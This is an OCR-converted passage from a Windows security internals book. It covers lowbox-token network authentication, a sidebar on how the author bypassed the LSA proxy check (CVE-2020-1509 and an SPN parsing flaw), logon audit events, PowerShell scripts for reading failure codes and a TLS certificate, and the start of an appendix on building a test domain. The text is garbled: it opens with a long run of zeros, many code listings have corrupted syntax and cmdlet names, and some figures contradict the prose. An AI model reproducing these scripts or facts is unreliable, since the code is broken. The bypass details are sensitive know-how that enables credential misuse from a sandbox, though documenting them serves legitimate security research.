000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
```

Listing 15-19: The Identity flag in an AP-REQ GSSAPI checksum

## Network Authentication with a Lowbox Token

When a process is running with a lobox token (described in Chapter 4), the LSA enforces restrictions on the use of network authentication. This is to make it harder for the sandbox application to abuse network authentication to get access to the user's logon session credentials and, through them, access their resources.

If the lowbox process can create a client authentication context, however, it can generate authentication tokens in only the following three scenarios:

- • Using logon session credentials with the Enterprise Authentication
capability

• Using logon session credentials to a known web proxy
• Using explicit credentials, such as a username and password
Let's discuss each of these scenarios.

### Authentication with the Enterprise Authentication Capability

The enterprise authentication capability, represented by the SID 5-1-15-3-8, can be granted when a lowbox token is created. With this capability, the lowbox process can use the user's logon session credentials to generate any supported network authentication tokens, such as those for NTLM or Kerberos, without restriction.

The enterprise authentication capability is designed for enterprises to use in their internal applications. Outside of enterprises, the primary means of deploying lowbox processes is via the Microsoft App Store, which has restricted the use of this capability in the application submission guidelines. If you apply to the Microsoft store with an application that uses the enterprise authentication capability, it must pass an extra review and might be rejected. However, if you're creating the lowbox token outside of a store application for testing purposes, there is no restriction, as demonstrated in Listing 15-20.

```bash
P5> $cred = New-LsaCredentialHandle -Package "Negotiate" -UseFlag Outbound
  P5> $sid = Get-NtSd -PackageName "network_auth_token"
  P5> Use-NtObject($token = Get-NtToken -LowBox -PackageSid $sid) {
        Invoke-NtToken $token { New-LsaClientContext -CredHandle $cred}
```

520    Chapter 15

---

```bash
# Exception calling ".ctor" with "s" argument(s): ("0x8090304") - The Local
Security Authority cannot be contacted
  P5> $cap = Get-NtSid -KnownSid CapabilityEnterpriseAuthentication
  P5> $use=NTObject($token = Get-NTToken -LowBox -PackageSid $sid
     -Capabilityid $cap} {
      ⓒ auth = Invoke-NTToken $token { New-LsaClientContext -CredHandle $cred}
        Format-LsaAuthToken $auth
    }
    <SPNEGO Init>
    Mechanism List   :
    1.3.6.1.4.1.311.2.2.10                     - NTLM
    1.2.840.48018.1.2.2                       - Microsoft Kerberos
    --snip--
```

Listing 15-20: Testing the lowbox enterprise authentication capability

We first create a lowbox Token object without the capability ❶ . When we create the client authentication context using New-LsaClientContext, we get an error ❷ . This error comes from the InitializeSecurityContext API, which PowerShell calls behind the scenes. Next, we create the lowbox token with the capability ❸ . This time, we can successfully create a client authentication context and format the client authentication token ❹ .

## Authentication to a Known Web Proxy

The lowbox process can generate tokens for authentication to web proxies, which commonly require that a domain user can access the internet. To support this use case, you can perform network authentication with the user's logon session credentials if the target name is set to the address of an approved proxy server.

For example, say the target name is HTTP-proxy.mxnetal.local . The system administrator must configure the proxy address either through the group policy or by using a Proxy Auto-Configuration (PAC) script, which makes sure that a web request with an arbitrary proxy configuration won't pass the LSA's checks. Listing 15-21 demonstrates the use of a web proxy target name to allow network authentication. You must have configured a system web proxy for this script to work.

```bash
PS> $cred = New-LsaCredentialHandle -Package "NTLM" -UseFlag Outbound
  PS> $client = New-Object System.Net.WebClient
  PS> $proxy = $client.Proxy.GetProxy("http://www.microsoft.com").Authority
  PS> $target = "HTTP/Spbox"
  PS> $target | Write-Output
  HTTP/192.168.0.10:1234
  PS> $sid = Get-NtSid -PackageName "network_auth_test"
  PS> Use-NtObject($token = Get-NtToken -LowBox -Packagesid $sid) {
    # $client = Invoke-NtToken $token {
        New-LsaClientContext -CredHandle $cred -Target $target
        }
    }
```

---

```bash
Format-LsaAuthToken $client
    }
    <NTLM NEGOTIATE>
    Flags: Unicode, Oem, RequestTarget, NTLM, AlwaysSign,...
```

Listing 15-21: Testing lowbox web proxy authentication

First, we query for the proxy setting using the WebClient .NET class ❶.


We then build the target SPN with an HTTP service class and the proxy


address ❷.

Next, we create the lowbox token ❸ . Notice that we haven't specified the enterprise authentication capability. We create the client authentication context and use the target SPN ❹ . The initial authentication succeeds, and we can perform the client authentication to the target proxy.

This proxy authentication is considered secure because the service should check the target name before permitting the authentication. If the lowbox process generates the authentication for the proxy SPN but then sends it to an SMB server, the authentication process should fail. For Kerberos authentication, the SPN selects the key to use for the ticket, so an incorrect SPN should make the ticket fail to decrypt if sent to the wrong service.

## Authentication with Explicit Credentials

The final option, shown in Listing 15-22, is to specify explicit credentials


when creating the credentials handle provided to the client authentication


context.

```bash
PS> $cred = New-LsaCredentialHandle -Package "Negotiate" -UseFlag Outbound -
-ReadCredential
UserName: user
Domain: GRAPHITE
Password: **********
PS> $sid = Get-NtSid -PackageName "network_auth_test"
PS> UseNtObject($token = Get-NtToken -LowBox -PackageSid $sid) {
    Invoke-NtToken $token {
     ■ $c = New-LsaClientContext -CredHandle $cred -Target "CIFS/localhost"
        Format-LsaAuthToken $c
    }
} <NTLM NEGOTIATE>
Flags: Unicode, OEM, RequestTarget, NTLM, AlwaysSign,...
```

Listing 15-22: Initializing the client authentication context with explicit credentials

To initialize the client authentication context, you still need to provide a target SPN. However, you don't need to specify a known proxy, as the target can be any service or host. In this case, we specify the CIFS/ localhost SPN.

When in a lobox token sandbox, you can act as a server for network authentication, as it's possible to get a Token object for a different user.

522    Chapter 15

---

However, unless the token's user exactly matches the caller's user and lowbox package SID, the returned token is set to the Identification level, which prevents it from being abused to elevate privileges. The restriction on the impersonation level applies even if the lowbox token has the enterprise authentication capability, as this grants access to the client authentication context only.

## BYPASSING THE PROXY CHECK

Microsoft very poorly documents these bypasses of the capability requirement for proxy authentication. The problem with security features for which there is little to no official documentation is that few developers know they exist, so they don't get tested as rigorously as they should, especially for unusual edge cases. In a utopian world, Microsoft would have implemented comprehensive security tests for the proxy check feature, but sadly, we don't live in such a world.

While researching the proxy check for this book, I reverse engineered its implementation in the LSA and noticed that if the target name isn't a proxy, the authentication process continues, but the LSA sets a flag for the security package that indicates it must use explicitly provided credentials. As we saw when we covered NTLM in Chapter 13, it's possible to provide the username and domain for the current user but leave the password empty; in that case, the security package will use the password from the logon credentials.

If you specify just the username and domain, the NTLM security package will consider them to be explicit credentials, satisfying the flag set by the LSA even though the authentication will use default credentials. This bypasses all the checks and grants a lowbox process access to the default user, which an attacker could abuse to access network resources accessible by that user. You can learn more about this issue in CVE-2020-1509.

Even after Microsoft implemented a fix, I was still able to bypass the check, as during my research I also noticed that the check for the target name wasn't implemented correctly. Recall from Chapter 13 that a target name is an SPN composed of three parts, separated by forward slashes: the service class, the instance name, and the service name. The parsing and checking code in the LSA had two problems:

- • It didn’t verify that the service class was HTTP or HTTPS.

• It checked the service name for the proxy address, not the instance name.
Not verifying the service class allowed the target name to refer to other services, such as CIFS, to use for authenticating to an SMB server. This let me construct a target name of the form CIFS/fileserver.domain.com/proxy.domain

.com. If proxy.domain.com was a registered proxy, this target name would pass the proxy check; however, the SMB server would care only about the service class and the instance name (here, fileserver.domain.com), and once again would allow access to the user's default credentials. Microsoft fixed this issue as well, although without assigning it a CVE number.

(continued)

---

The main root cause of the service name problem was that the API Microsoft used to parse the SPN would set the service name component to match the instance name component if no service name were provided. For example, HTTP/proxy.domain.com would set both the instance name and the service name to proxy.domain.com. Therefore, this code worked in Microsoft's limited testing, but broke when someone decided to test the feature's edge cases. I mentioned the target name parsing bypass to Microsoft when reporting the original issue, but for some reason, it wasn't fixed at the same time. In addition to supporting my previous statement about undocumented features often not being very well tested, this example demonstrates why you should always verify any changes a developer makes to ensure they've implemented a comprehensive fix.

That said, Microsoft recommends disabling automatic authentication to HTTP proxy servers when it's not required by adding the AllUserIpDenied ProxyAuth registry key value to HKEY_LOCAL_MACHINE\System\Current ControlSet\Combo\Usa and setting its value to 0. If the value doesn't exist, Windows enables this authentication by default if targeting a proxy.

## The Authentication Audit Event Log

Let's wrap up our discussion of authentication with an overview of the auditing data generated during interactive and network authentication. When you're monitoring an enterprise network, you might want to know which users have attempted to authenticate to the Windows system. By analyzing the audit log, you can identify their successful and unsuccessful authentication attempts to a machine.

You can find the authentication audit log records in the same security event log we inspected in Chapter 9 when discussing object audit events. We can use a similar technique of filtering the log by event ID to get the events we're interested in. Here are some event IDs for important authentication events:

4624 An account logged on successfully.

4625 An account failed to log on.

4634 An account logged off

Let's look at the information these events provide. Listing 15-23 starts by querying the security event log for the successful logon event, 4624. Run this command as an administrator:

```bash
PS> Get-WinEvent -FilterHashtable @\@name='Security';id={4624} | \
Select-Object -ExpandProperty Message
An account was successfully logged on.
```

524    Chapter 15

---

```bash
Subject:
        Security ID:        S-1-5-18
        Account Name:       GRAPHITE$~        Account Domain:      MINERAL
        Logon ID:            0x3E7
Logon Information:
        Logon Type:          2
        Restricted Admin Mode: No
        Virtual Account:      No
        Elevated Token:       Yes
Impersonation Level:       Impersonation
New Logon:
        Security ID:        S-1-5-21-1195776225-522706947-2538775957-1110
        Account Name:       alice
        Account Domain:      MINERAL
        Logon ID:            0x15CB183
        Linked Logon ID:       0x15CB186
        Network Account Name:   -
        Network Account Domain:  -
        Logon GUID:          {d406e311-85e0-3932-ddf5-99bf5d834535}
Process Information:
        Process ID:            0x630
        Process Name:         C:\Windows\System32\winlogon.exe
Network Information:
        Workstation Name:       GRAPHITE
        Source Network Address:  127.0.0.1
        Source Port:            0
Detailed Authentication Information:
        Logon Process:       User32
        Authentication Package:   Negotiate
        Transited Services:      -
        Package Name (NTLM only): -
        Key Length:            0
```

Listing 15-23: A log record for a successful interactive authentication event

This listing shows an example entry for a successful authentication event. On a frequently used system there are likely to be many such entries, so pick just one to inspect.

The event records contain a lot of information, some of which might not be populated for certain logon types. Each entry starts with information about the user account that has made the authentication request. For an interactive authentication, you'll likely find this to be a privileged account, such as the SYSTEM computer account. Next comes information about the logon, including the logon type. The 2 indicates interactive. Some other logon types are network (3), batch (4), service (5), and remote interactive (10). This section also indicates whether Restricted Admin

Negotiate Authentication and Other Security Packages  525

---

mode was used for the authentication and whether the session the event represents is elevated. It's followed by an indication of the token's impersonation level.

The following section contains the details of the logon session cre- ated for the successful authentication, including the user's SID, name, and domain. As this is an elevated interactive authentication, we see two logon IDs: one for the session itself and one for the linked, non-elevated logon session created for UAC.

Next come the details of the process making the authentication request. In this example, it's the process that called lsalongsUser. The final two sections contain network authentication information and additional details that didn't fit into other categories. Part of the detailed authenication information is the security package used for the authentication. In this case, Negotiate was used, so it will have chosen the best authentication protocol for the user.

You'll see the same type of event record generated regardless of whether authentication occurred through syslogdollar or through network authentication. For example, if the event is for an NTLM network authentication, you should see something like Listing 15-24 in the detailed authentication information section.

```bash
Detailed Authentication Information:
  Logon Process:       NtlmSsp
  Authentication Package:   NTLM
  Transited Services:     -
  Package Name (NTLM only): NTLM V2
  Key Length:            128
```

Listing 15-24: The detailed information for a successful NTLM network authentication

Let's now look at a failed authentication event. Listing 15-25 queries for events with an ID of 4625, as an administrator.

```bash
PS> Get-WinEvent -FilterHashtable @(\logname="Security';id={(4625)}) |
Select-Object -ExpandProperty Message
An account failed to log on.
--snip--
Account For Which Logon Failed:
    Security ID:      5-1-0-0
    Account Name:      alice
    Account Domain:   MINERAL
Failure Information:
    Failure Reason:     Unknown user name or bad password.
        Status:            0xC000006D
    Sub Status:         0xC000006A
--snip--
```

Listing 15-25: A failed authentication event log record

526    Chapter 15

---

In the output, I've highlighted just one record. It has many of the same sections as for a successful authentication, so I've removed anything that appears in both types of record.

The first of the sections shown here contains details on the user account that failed to authenticate. The SID entry isn't guaranteed to be valid; for example, in this case, the SID does not represent the alive user. Next, we get more details about the failure, starting with a text version of the error, followed by the status, which here is an NT status code of STATUS _LOGON_FAILURE. The sub-status code provides more detail; in this case, it's STATUS_WRONG_PASSWORD, which indicates that the user did not provide a valid password. Other sub-status codes you might encounter include STATUS_NO_SUCH_USER, if the user doesn't exist, and STATUS_ACCOUNT_DISABLED, if the user's account has been disabled.

Finally, we'll look at a log-off event, generated when a logon session is deleted. This typically occurs when no Token objects that reference the logon session remain. Run the command in Listing 15-26 as an administrator.

```bash
PS> Get-WinEvent -FilterHashtable @{logname="Security";id=@(4634)} |
Select-Object -ExpandProperty Message
An account was logged off.
Subject:
    Security ID:    5-1-5-21-1195776225-522706947-2538775957-1110
    Account Name:    alice
    Account Domain: MINERAL
    Logon ID:       0x15CB183
Logon Type:       2
```

Listing 15-26: A log-off authentication event log record

This event log record is much simpler than those for successful or failed authentication. It contains just the subject information, including the username and domain. To match a successful authentication event to the corresponding log-off event, you can compare the logon IDs.

## Worked Examples

Let's finish with some worked examples using the commands you've learned about in this chapter.

### Identifying the Reason for an Authentication Failure

I noted in the previous section that you'll see two status codes in the event log when an authentication process fails: there's the main status, typically STATUS_LOGON_FAILURE , and a sub-status, such as STATUS_WRONG_PASSWORD . Unfortunately, the event log automatically converts only the main staus code to a string, then typically generates a generic “ The username or password is incorrect ” message that isn't very helpful in diagnosing

Negotiate Authentication and Other Security Packages   527

---

authentication failures. Let's write a quick script to analyze the event log records and convert the sub-status codes to messages automatically.

One immediate problem we must solve is how to get the sub-status code from the event log record. You could try to manually parse it from the text message. However, you'll see different messages for different languages, and you might not be able to rely on the presence of a text string such as SubStatus. The event log record, however, does contain all its important information as separate properties, and you can query for these using the Properties property on the event log record object. Listing 15-27 shows the output generated by such a query.

```bash
PS> $record = Get-MinEvent -FilterHashtable @{logname='Security';id=@(4634)} |
Select -First 1
PS> $record.Properties
Value
-----
$-1-5-21-119577625-522706947-2538775957-1110
alice
MINERAL
--snip--
Listing 15-27: Displaying an event log's record properties
```

Unfortunately, the list of properties contains only the values, with no indication of the properties' names. We want the property with the name SubStatus , which might always be at the same index in the properties list, but there is no guarantee that will always be the case. So, to get this information we must manually inspect the XML that stores the event log's properties. We can request this by using the fooM method on the record. Listing 15-28 shows how to extract named properties from an event log record.

```bash
PS> function Get-EventLogProperty (
    [CmdletBinding()]
    param(
        [parameter(Mandatory, Position = 0, ValueFromPipeline)]
        [System.Diagnostics.Eventing.Reader.EventRecord]$Record
    )
    PROCESS {
     @ $xml = [xml]$Record.ToXml()
     $ht = 0{
         TimeCreated = $Record.TimeCreated
         Id = $Record.Id
    }
     @ foreach($ent in $xml.Event.EventData.data) {
         $ht.Add($ent.Name, $ent("#text")
    }
     [PSCustomObject]$ht
    }
    }
PS> Get-EventLogProperty $record
SubjectUserName            : alice
TimeCreated                : 2/24 1:15:06 PM
```

528    Chapter 15

---

```bash
IpPort                : -
  SubjectLogonId            : 0x54541
  KeyLength              : 0
  LogonProcessName        : Advapi
  IpAddress               : -
  LmPackageName             : -
  TransmittedServices      :
  WorkstationName         : GRAPHITF
  SubjectUserID             : S-1-5-21-1195776225-522706947-2538775957-1110
  SubStatus               : 0xc00006a
  AuthenticationPackageName : Negotiate
  SubjectDomainName        : MINERAL
  ProcessName              : C:\Program Files\PowerShell\7\pwsh.exe
  FailureReason           : %%z313
  LogonType               : 3
  Id                              : 4635
  Status                          : 0xc000006d
  TargetUserID             : S-1-0-0
  TargetDomainName       : mineral.local
  ProcessId               : 0xe48
  TargetUserName          : alice
```

Listing 15-28: Extracting the named event log record properties

We start by defining the Get-EventLogProperty function, which will convert each record to a new object. We need to extract an event log record's XML and then parse it into an XML document ❶ . The EventData XML element stores the properties, so we use the object model PowerShell provides to extract each element and build a hash table from the property name and body text ❷ . We then convert the hash table to a custom PowerShell object to make it easier to query.

When inspecting the new object's properties, we find that the SubStatus property is now easily accessible ❶ . There are some limitations with our approach; for example, we haven't converted the failure reason from a resource identifier to a string ❷ . However, we don't need the failure reason, as we can get the message from the status code if we want it.

Now let's expand our code to extract the sub-status for authentication failures (Listing 15-29).

```bash
# PS> function Get-AuthFailureStatus {
        [CmdletBinding()]
        param(
            [parameter(Mandatory, Position = 0, ValueFromPipeline)]
            $Record
        )
        PROCESS {
            [PSCustomObject]@{
                TimeCreated = $Record.TimeCreated
                UserName = $Record.TargetUserName
                DomainName = $Record.TargetDomainName
                $SubStatus = (Get-NTsStatus - Status $Record.SubStatus).StatusName
```

---

```bash
}
    }
}  }
}  }
}  PS> Get-NtToken -Logon -User $env:USERNAME -Domain $env:USERDOMAIN
    -Password "InvalidPassword"
    PS> Get-NtToken -Logon -User "NotAtAllUser" -Domain $env:USERDOMAIN
    -Password "pwd"
}  PS> Get-WinEvent -FilterHashtable @{logname="Security";id@{(4625)}
    Select-Object -First 2 | Get-EventLog Property | Get-AuthFailureStatus
     TimeCreated                Username               DomainName   SubStatus
      ----------------------------- ----------------------------- -----------------
    2/24         1:15:06 PM  alive                     MINERAL      STATUS_WRONG_PASSWORD
    2/24/       1:14:45 PM  NotAtAllUser  MINERAL      STATUS_NO_SUCH_USER
```

Listing 15-29: Parsing authentication failure properties and converting their sub-status codes

We start by defining a function that converts the record properties into a simpler authentication failure object ❶ . We pull out only the timestamp, the username, and the domain name, and then convert the Substatus property to its NT status name ❷ .

We then perform two failed authentications to generate some entries in the event log . We filter the log to return only authentication failure records, then convert the records in the pipeline . In the generated output, we can see two entries. The first has STATUS _ WRONG password as the sub-status, indicating that the user was valid but the password was not. The second has STATUS _ NO _ SUCH user , which indicates that the user doesn't exist.

## Using a Secure Channel to Extract a Server's TLS Certificate

Next, let's walk through a simple example of how to use the secure channel authentication protocol. We'll make a TCP connection to a secure web server and extract its server certificate, then use it to retrieve details about the organization that might own the server and whether the certificate is valid.

Note that there are likely much better ways of getting the server's certificate than the approach taken in this example. For example, most web browsers will allow you to display and export the certificate by browsing to the server. However, that wouldn't help you learn much about how secure channel works. To get started, copy the contents of Listing 15-30 into the script file get_server_cert.ps1 .

```bash
❶ param(
        [Parameter(Mandatory, Position = 0)]
        [string]$Hostname,
        [int]$Port = 443
    )
  $ErrorActionPreference = "Stop"
❷ function Get-SocketClient {
        param(
            [Parameter(Mandatory)]
```

---

```bash
$Socket
    )
    $Socket.ReceiveTimeout = 1000
    $Socket.Client.NoDelay = $true
    $stream = $Socket.GetStream()
    return 0(
        Reader = [System.IO.BinaryReader]::new($stream)
        Writer = [System.IO.BinaryWriter]::new($stream)
    }
  }
❶ function Read-TlsRecordToken {
    param(
        [Parameter(Mandatory)]
        $client
    )
    $reader = $Client.Reader
    $header = $reader.ReadBytes(5)
    $length = {[int]$header[3] -shl 8} -bor ($header[4])
    $data = 0()
    ⚐ while($length -gt 0) {
        $next = $header.ReadBytes($length)
        if ($next.length -eq 0) {
            throw "End of stream."
        }
        $data += $next
        $length -= $next.Length
    }
    Get-LsaAuthToken -Token ($header+$data)
    }
❷ Use-NtObject($socket = [System.Net.Sockets.TcpClient]::new($Hostname, 443)) {
    $tcp_client = Get-SocketClient $socket
    ⚐$credout = New-LsaCredentialHandle -Package "$channel" -UseFlag Outbound
    $client = New-LsaClientContext -CredHandle $credout -Target $Hostname
    -RequestAttribute ManualCredValidation
    ⚐ while((Test-LsaContext -Context $client)) {
        ⚐ if ($client.Token.length -gt 0) {
            $tcp_client.Writer.Write($client.Token.ToArray())
        }
    ⚐$record = Read-TlsRecordToken -Client $trp_client
        Update-LsaClientContext -Client $client -Token $record
    }
    ⚐ $client.RemoteCertificate
}
```

Listing 15-30: A script for reading a TLS server certificate

Negotiate Authentication and Other Security Packages   531

---

We first define a couple of parameters, for the hostname of the server and the optional TCP port . HTTPS uses the well-known port 443; however, TLS is not restricted to only that port, so you can change it if you want to target a different service.

We then define a couple of functions. The first one, Get-SocketClient, converts a TCP client object to a BinarReader and BinarWriter . The TLS protocol has a relatively simple binary record structure, so using these classes makes it easier to parse the network traffic.

The second function, Read-TlsRecordToken, reads a single TLS record from the server and returns it as an authentication token . We first read the 5-byte header from the record and extract the data's length, then we read the data from the stream. Because TCP is a streaming protocol, there is no guarantee that all the required data will be returned in a single read, so you'll have to perform the read in a loop until you've received everything you need .

We now enter the body of the script. We start by making a TCP connection to the hostname and TCP port provided as arguments to the script ❸ . We then convert the socket to the reader and writer objects. Next, we create the Channel credentials and client context ❺ , setting the client context target to the hostname and enabling manual credential validation, as we don't really care if the server certificate is invalid for the purposes of this example.

We can now loop until the client context has completed authentication ❷ . If there is a token to send to the server, we convert it to bytes and write it to the TCP socket ❸ . As we saw earlier, the TLS client and server can generate more than one TLS record, which the context must handle before generating a new token.

Once we've sent the client authentication token, we can read the next


TLS record from the server and update the client ❹. This loop will carry on until either the authentication completes successfully or an exception stops the script. Finally, we can return the server's certificate from the script ❸.

Listing 15-31 shows how to use the script we wrote.

```bash
PS> $cert = .\get_server_cert.ps1 -Hostname www.microsoft.com
PS> $cert
Thumbprint                     Subject
---------------------------  -----------------
9B28AE65169AA477C5783D6480F296EF48CF14D  CN=www.microsoft.com,...
PS> $cert | Export-Certificate -FilePath output.cer
        Directory: C:\demo
Mode             LastWriteTime            Length Name
----                ----------------------------- -----
-----              02-21   17:10              2173  output.cer
```

Listing 15.31: Getting the server certificate for www.microsoft.com and exporting it

to a file

You call the script by providing the hostname of the server. Optionally, you could specify the TCP port, but in this case, we use port 443, better

---

known as HTTPS, which is the script's default. The returned certificate is an object you can inspect using PowerShell. You can also export the certificate to a file using the Export-Certificate command.

## Wrapping Up

This chapter began by describing security buffers and how they're used to pass information back and forth with the SSPI APIs during network authentication and the encryption and signing processes. It then provided an overview of the Negotiate authentication protocol, which allows network authentication to take place when both parties aren't sure ahead of time what authentication protocol to use.

Next, we looked at some less commonly used security packages, secure channel and CreDSSP. These have specific niches but also more complex usage compared to NTLM or Kerberos. We also discussed anonymous and identity network authentication in NTLM and Kerberos and covered network authentication inside a lowbox token sandbox (and I described how I circumvented this authentication multiple times).

The chapter finished with an overview of the security audit events generated when a user authenticates. You learned about the different event types used to describe whether a user's authentication succeeded or failed, and saw how to use these to figure out which users have attempted to authenticate to a workstation.

## Final Thoughts

As we wrap up this final chapter, I hope you'll apply the information you've learned here about the internals of Windows security to your own endeavors. I've covered many areas in detail, ranging from the Security Reference Monitor and tokens to access checking and authentication, providing examples to demonstrate important topics.

However, I wasn't able to provide scripts to demonstrate every permutation of the features we discussed. For that reason, I recommend checking the help feature for the various commands provided with the t00bject

Manager module and experimenting with their use. If you perform tests against a Windows virtual machine, there is little you can damage. (In fact, if your system develops a blue screen of death while you're experimenting, it might be a good idea to dig into why, as you might have found a security vulnerability.)

Following this chapter are some additional reference materials:


Appendix A contains a walkthrough for setting up a domain network for testing, and Appendix B contains a list of SDDL aliases.

---



---

## BUILDING A WINDOWS DOMAIN NETWORK FOR TESTING

![Figure](figures/WindowsSecurityInternals_page_565_figure_001.png)

Several chapters in this book make reference to a Windows domain network you can use for testing purposes. While you don't

need to set up such a network to follow along with the chapters, you can use it to run the examples, then alter the provided commands to observe different outcomes. If you don't already have a suitable Windows domain network on hand to use for testing, this appendix will walk you through setting one up with virtual machines.

Running Windows in a virtual machine has many advantages. First, it gives you complete flexibility to configure (or misconfigure) Windows without compromising the security of your everyday installation. Virtualization platforms typically allow you to snapshot your virtual machines so you can roll them back to a known good state if something goes wrong. You can

---

also isolate network traffic to prevent it from affecting other systems on the same network. Lastly, you can use a virtual machine to run Windows in a non-Windows environment.

The domain configuration steps use PowerShell whenever possible.


Note that, unless otherwise stated, you must run all of these PowerShell


commands as an administrator user.

## The Domain Network

Figure A-1 is a diagram of the network we'll build. For more information about the structure of domain networks in general, consult Chapter 10.

![Figure](figures/WindowsSecurityInternals_page_566_figure_004.png)

Figure A-1: The domain network configuration

The network includes a forest made up of three domains. The root DNS name for the forest is mineral.local, and its two child domains are engineering .mineral.local and sales.mineral.local. To create a minimal functional domain for testing, you need only PRIMARYDC, which is the root domain controller, and GRAPHITE, a workstation joined to the domain. Anything included in dotted lines is optional. The next sections will show you how to set up the domain network and configure virtual machines for each of the Windows systems you want to include.

---

## Installing and Configuring Windows Hyper-V

We'll set up the Windows domain network using Hyper-V, which is virtualization software that comes for free on 64-bit versions of Windows Professional, Enterprise, and Education. If you're not running Windows or don't want to use Hyper-V, another good free option is Oracle's VirtualBox (https://www.virtualbox.org).

To install Hyper-V and its tools, start an administrator PowerShell console and run the following command. Make sure to restart the system after installation:

```bash
PS> Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All
```

The next step is to configure a new network for the virtual machines, as shown in Listing A1 . This allows you to have complete control over all aspects of the network configuration for the domain network and isolates it from your real network.

```bash
PS> New-VMSwitch -Name "Domain Network" -SwitchType Internal
PS> $index = {Get-NetAdapter} |
Where-Object Name -Match "Domain Network".ifIndex
PS> New-NetIPAddress -IPAddress 192.168.99.1 -PrefixLength 24
-InterfaceIndex $index
PS> New-Netath -Name DomNAT -InternalIPInterfaceAddressPrefix 192.168.99.0/24
```

Listing A-1: Creating a new virtual machine network switch

We first create a new switch for the domain network using the New-VM Switch command, which you need to do only once during this initial configuration process. We give the switch the name "Domain Network" and set its type to Internal, which means it's a virtual network that can communicate with the virtual machine host.

Next, we need to assign the virtual network adapter that was created for the switch with an IP address. The Get-NetAdapter command lists all network adapters and finds the unique index number for the adapter for our domain network. We then assign the IP address of 192.168.99.1 to the adapter, with a subnet prefix of 24 bits (perhaps more commonly seen as the subnet mask 255.255.255.0). You're welcome to set the IP address to any value you like, but keep in mind that if you change the address, you'll also need to update it throughout the rest of this appendix.

The final step is to set up network address translation (NAT) for the IP address using the New-NetNat command. This will allow computers on the network to access the internet by setting their default gateway to the adapter’s IP address, in this case 192.168.99.1.

NOTE

This configuration doesn't set up a Dynamic Host Configuration Protocol (DHCP) server to automatically assign IP addresses to computers on the network. As the network is so small, we'll just statically assign IP addresses to the computers as we go.

Building a Windows Domain Network for Testing 537

---

## Creating the Virtual Machines

Table A-1 lists the virtual machines we'll set up, along with the operating system type and IP address for each. I'll walk through setting up the PRIMARYDC , GRAPHITE , and optional SALESDC virtual machines. The other virtual machines in the table are completely optional; if you want to create them, you can replace the specified values in the sections on setting up each virtual machine with the appropriate values from the table.

Table A-1: Virtual Machine Names and IP Addresses

<table><tr><td>Virtual machine name</td><td>Operating system</td><td>IP address</td></tr><tr><td>PRIMARYDC</td><td>Windows Server</td><td>192.168.99.10</td></tr><tr><td>GRAPHITE</td><td>Windows Professional or Enterprise</td><td>192.168.99.50</td></tr><tr><td>CINNABAR</td><td>Windows Server</td><td>192.168.99.20</td></tr><tr><td>SALESDC</td><td>Windows Server</td><td>192.168.99.110</td></tr><tr><td>GOLD</td><td>Windows Professional or Enterprise</td><td>192.168.99.150</td></tr><tr><td>ENGDCC</td><td>Windows Server</td><td>192.168.99.210</td></tr><tr><td>STEEL</td><td>Windows Professional or Enterprise</td><td>192.168.99.220</td></tr></table>


Microsoft provides trial editions of Windows Enterprise and Windows Server as virtual machines. I'd recommend using your favorite search engine to find the latest links on Microsoft's website. For each machine, install the correct Windows version and then use PowerShell to configure it.

To use Windows virtual machines with Hyper-V, you'll need the installation media and license keys for Windows Professional or Enterprise and Windows Server. A common way to get access to these is through a Microsoft Visual Studio subscription. The versions of Windows and Server you use won't matter for the topics we'll discuss.

NOTE

Server installations include a long-term service branch that comes with the Windows desktop and a more up-to-date version, called a server core version, that has only a command line. As we'll configure the server installation with PowerShell, either version will work. However, if you're more comfortable with a GUI, use the long-term service branch with a desktop instead.

Listing A-2 defines the function we'll use to do most of the work of setting up a virtual machine, New-TestVM .

```bash
PS> function New-TestVM {
    param(
        [Parameter(Mandatory)]
        [string]$VmName,
        [Parameter(Mandatory)]
        [string]$InstallerImage,
        [Parameter(Mandatory)]
        [string]$VmDirectory
    )
    }
```

---

```bash
*  #NewVM - Name $VMName -MemoryStartupBytes 2GB -Generation 2
 *  -NewVHDPath "$VMDirectory/$VMName/$VMName.vhdx" -NewVHDSizeBytes 80GB
 *  -Path "$VMDirectory" -SwitchName "Domain Network"
 *  #Set-VM - Name $VMName -ProcessorCount 2 -DynamicMemory
 *  #Add -VMSciController -VMName $VMName
 *  Add -VMDVDDrive -VMName $VMName -ControllerNumber 1 -ControllerLocation 0
 *-Path $InstallerImage
 * $vd = Get-VMDVDDrive -VMName $VMName
   Set-VMFirmware -VMName $VMName -FirstBootDevice $vdv
```

Listing A-2: Defining the New-TestVM function

The New-TestVM function takes the name of the virtual machine so it can create the path to the DVD image to install and the base directory for the virtual machine's assets. We start by calling the New-VM command to create the virtual machine . We set its memory to 4GB and create an 80GB virtual hard disk. (You can increase these sizes if you like.) We also assign the default network adapter to use the "Domain Network" switch we created in Listing A-1.

Next, we use the Set-Nrm command to configure some virtual machine options not exposed through New-VM ❶. We assign two CPUs to the virtual machine, as I find modern versions of Windows struggle with only one CPU. You can increase the number of CPUs if your base machine has many CPU cores.

We also enable dynamic memory. This allows Windows to scale the virtual machines' memory usage as needed. I've found that typically a server installation uses only around 3GB of memory when running, but it could be more, especially for clients. Dynamic memory can both increase and decrease allocated memory as needed.

Finally, we set up a DVD drive on a virtual SCSI controller and assign the DVD image to it ❸. We'll use this as the primary boot drive, so we can install the operating system from the DVD image.

We now need to create each virtual machine using the function we defined and start the installation process.

## The PRIMARYDC Server

The PRIMARYDC machine is a Windows server that will act as the root domain controller for our forest. In Listing A-3, we start by creating the virtual machine as an administrator.

```bash
PS> New-Test-VM -VmName "PRIMARYDC" -InstallerImage "C:\iso\server.iso"
  -VmDirectory "C:\"
PS> vmconnect localhost PRIMARYDC
PS> Start-VM -VmName "PRIMARYDC"
```

Listing A-3. Creating and starting the PRIMARYDC virtual machine

Building a Windows Domain Network for Testing 539

---

